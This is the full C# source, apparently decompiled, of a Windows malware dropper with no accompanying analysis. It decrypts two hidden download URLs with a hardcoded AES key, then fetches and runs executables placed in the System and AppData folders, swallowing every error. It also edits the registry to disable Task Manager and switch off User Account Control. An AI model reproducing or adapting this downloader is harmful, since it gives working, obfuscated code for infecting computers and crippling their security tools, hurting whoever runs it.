using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

internal static class Class0
{
	public static void Main()
	{
		try
		{
			string fileName = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + Path.GetFileNameWithoutExtension(Path.GetTempFileName()) + ".exe";
			new WebClient().DownloadFile(smethod_0("vn/9Zri3aj4c4amDn2GqlWpFrgMH0UXlkOeX03zIc5dQkZdf16ypPkxCBxXlSNCn"), fileName);
			Process.Start(fileName);
		}
		catch
		{
		}
		try
		{
			string fileName2 = Environment.ExpandEnvironmentVariables("%AppData%") + "\\" + Path.GetFileNameWithoutExtension(Path.GetTempFileName()) + ".exe";
			new WebClient().DownloadFile(smethod_0("vn/9Zri3aj4c4amDn2GqlWpFrgMH0UXlkOeX03zIc5dxfAMrzeauK3A1HX9HppQd"), fileName2);
			Process.Start(fileName2);
		}
		catch
		{
		}
		Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
		Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("EnableLUA", "0", RegistryValueKind.DWord);
	}

	private static string smethod_0(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = new byte[32];
		byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes("acHuFsIZSD"));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		byte[] array2 = Convert.FromBase64String(string_0);
		return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
	}
}
